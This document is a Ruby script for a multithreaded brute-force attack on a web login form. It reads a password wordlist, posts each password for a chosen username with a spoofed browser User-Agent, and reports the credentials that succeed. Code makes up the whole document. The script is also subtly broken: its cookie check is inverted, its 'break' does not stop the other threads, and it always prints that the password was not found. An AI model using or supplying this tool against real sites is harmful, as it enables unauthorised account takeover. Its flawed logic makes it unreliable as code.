require 'uri'
require 'typhoeus'
require 'colorize'

print '[+] Enter Page URL: '
url = gets.chomp

print '[+] Enter Username For The Account To Bruteforce: '
username = gets.chomp

print '[+] Enter Password File To Use: '
password_file = gets.chomp

print '[+] Enter String That Occurs When Login Fails: '
login_failed_string = gets.chomp

print 'Enter Cookie Value(Optional): '
cookie_value = gets.chomp

def cracking(username, url, password_file, login_failed_string, cookie_value)
  passwords = File.readlines(password_file).map(&:strip)

  threads = []

  passwords.each do |password|
    threads << Thread.new(password) do |pass|
      puts "[*] Trying: #{pass}".red

      data = { 'username' => username, 'password' => pass, 'Login' => 'submit' }

      options = { method: :post, headers: { 'User-Agent' => 'Mozilla/5.0' }, body: data }

      options[:headers]['Cookie'] = cookie_value if cookie_value&.strip&.empty?

      response = Typhoeus::Request.new(url, options).run

      next if response.body.include?(login_failed_string)

      puts "[+] Found Username: ==> #{username}".green
      puts "[+] Found Password: ==> #{pass}".green
      break
    end
  end

  threads.each(&:join)
end

cracking(username, url, password_file, login_failed_string, cookie_value)

puts '[!!] Password Not In List'

